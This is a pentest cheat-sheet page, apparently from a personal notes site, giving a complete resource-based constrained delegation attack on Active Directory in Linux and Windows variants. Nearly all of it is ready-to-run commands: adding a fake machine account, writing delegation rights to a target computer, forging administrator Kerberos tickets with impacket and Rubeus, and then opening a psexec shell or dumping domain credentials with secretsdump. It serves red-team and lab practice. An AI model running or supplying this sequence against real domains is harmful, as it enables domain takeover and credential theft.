---
title: "RBCD Attack"
date: 2024-7-30
tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-based constrained delegation", "s4u", "impersonate"]
---

---
### RBCD Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Check machine account quota

<div>

```bash
nxc ldap 10.10.11.10 -u <USER> -p <PASSWORD> -M MAQ
```

</div>

#### 1. Add a fake computer

<div>

```bash
impacket-addcomputer -computer-name 'EvilComputer' -computer-pass 'password' -dc-ip 10.10.11.10 <DOMAIN>/<USER>:<PASSWORD>
```

</div>

#### 2. Rbcd attack

<div>

```bash
impacket-rbcd -delegate-to <TARGET_COMPUTER>$ -delegate-from EvilComputer$ -dc-ip <DC> -action 'write' <DOMAIN>/<USER>:<PASSWORD>
```

</div>

#### 3. Impersonate

<div>

```bash
sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:password'
```

</div>

#### 4. Import ticket

<div>

```bash
export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
```

</div>

#### 5. Post-Attack

<div>

```bash
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```bash
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

<div>

```powershell
. .\PowerView.ps1
```

</div>

#### 2. Check machine account quota

<div>

```powershell
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

</div>

#### 3. Import Powermad.ps1

<div>

```powershell
. .\Powermad.ps1
```

```powershell
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString 'password' -AsPlainText -Force)
```

</div>

<small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>

#### 4. Attack

<div>

```powershell
$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```powershell
$fakesid
```

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```powershell
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```powershell
$SD.GetBinaryForm($SDBytes, 0)
```

```powershell
Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

</div>

#### 5. Check SecurityIdentifier is now fakesid 

<div>

```powershell
$RawBytes = Get-DomainComputer TARGET_COMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```powershell
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```powershell
$Descriptor.DiscretionaryAcl
```

</div>

#### 6. Impersonate

<div>

```powershell
.\rubeus.exe hash /password:password /user:EvilComputer /domain:<DOMAIN>
```

```powershell
.\rubeus.exe s4u /user:EvilComputer$ /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
```

</div>

#### 7. Convert to ccache format

<div>

```bash
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

```bash
export KRB5CCNAME=secrets.ccache
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

</div>

#### 8. Post-Attack

<div>

```bash
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```bash
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

</div>

{{< /tabcontent >}}

<br>
